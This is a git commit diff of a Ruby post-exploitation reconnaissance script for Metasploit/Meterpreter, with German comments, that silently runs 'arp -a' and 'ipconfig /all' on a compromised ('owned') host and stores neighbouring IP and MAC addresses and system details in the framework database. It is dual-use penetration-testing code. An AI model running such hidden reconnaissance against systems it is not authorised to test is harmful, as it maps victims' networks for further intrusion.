6306225f0be1ff96d4abad9a9e2d6b54ee5a28f3
Willi Fast <wifali@arcor.de>
2010-12-06 23:34:03 +0100

    get_arp_a returniert ein array von hosts, die später der db hinzugefügt werden können

--- script/reconnaissance/reconnaissance.rb
+++ script/reconnaissance/reconnaissance.rb
@@ -6,8 +6,9 @@ require 'pp'
 # * Zeile 22 würde auch "xj-z-?.-@3-..." matchen "\S = nicht Whitespace"
 
 # Function for running arp -a on the owned host
-def save_arp_a
-  @client.response_timeout=120
+def get_arp_a_infos
+  hosts = Array.new
+  index = 0
   cmd = 'arp -a'
   r, cmdout = '', ''  
   r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
@@ -22,28 +23,55 @@ def save_arp_a
     # write found ip- and mac adress in database           
     if not b.empty? and not c.empty?
       c = c.first.to_s.gsub('-',':')
-      if session.framework.db.active
-        session.framework.db.report_host(
-          :workspace => session.framework.db.workspace,
-          :host => b.first.to_s,
-          :mac  => c
-        )
-      end
+      hosts[index] = {
+        :workspace => session.framework.db.workspace,
+        :host => b.first.to_s,
+        :mac  => c
+      }
+    index += 1
     end
   end
   r.channel.close
   r.close
+  hosts
 end
 
+# TODO Parsen ist nicht Sprachunabhängig
 def get_host_infos
+  hostdata = Hash.new
+  hostdata[:workspace] = session.framework.db.workspace
+  r, cmdout = '', '' 
+  r = @client.sys.process.execute('ipconfig /all', nil, {'Hidden' => true, 'Channelized' => true})
+  while d = r.channel.read
+    cmdout << d
+  end 
+  
+  cmdout.split("\n").each do |line|
+    if line.include? "Physikalische Adresse"
+      hostdata[:mac] = (line.split(":")[1]).strip
+    end
+    if line.include? "IP-Adresse"
+      hostdata[:host] = (line.split(":")[1]).strip
+    end
+  end
+    
   sysinfo = client.sys.config.sysinfo
-  hostdata = {
-    :os => sysinfo['OS'],
-    :computer => sysinfo['Computer'],
-    :arch => sysinfo['Architecture'],
-    :language => sysinfo['System Language']
-  }
+  hostdata[:os_name]       = sysinfo['OS']
+  hostdata[:name] = sysinfo['Computer']
+  hostdata[:arch]     = sysinfo['Architecture']
+  hostdata[:os_lang] = sysinfo['System Language']
+   
+  hostdata
 end
 
-save_arp_a
-pp get_host_infos
+def write_db host
+  if session.framework.db.active
+    session.framework.db.report_host host
+  end
+end
+
+get_arp_a_infos.each do |host|
+  write_db host
+end
+
+write_db get_host_infos
